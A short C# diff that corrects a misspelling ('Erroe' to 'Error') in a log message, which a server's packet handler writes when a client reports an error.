@@ -69,7 +69,7 @@ namespace Server.Handle_Packet
 
                         case "Error":
                             {
-                                new HandleLogs().Addmsg($"Erroe from {client.Ip} client: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
+                                new HandleLogs().Addmsg($"Error from {client.Ip} client: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                                 /*lock (Settings.LockListviewClients)
                                 {
                                     client.LV.ForeColor = Color.Empty;
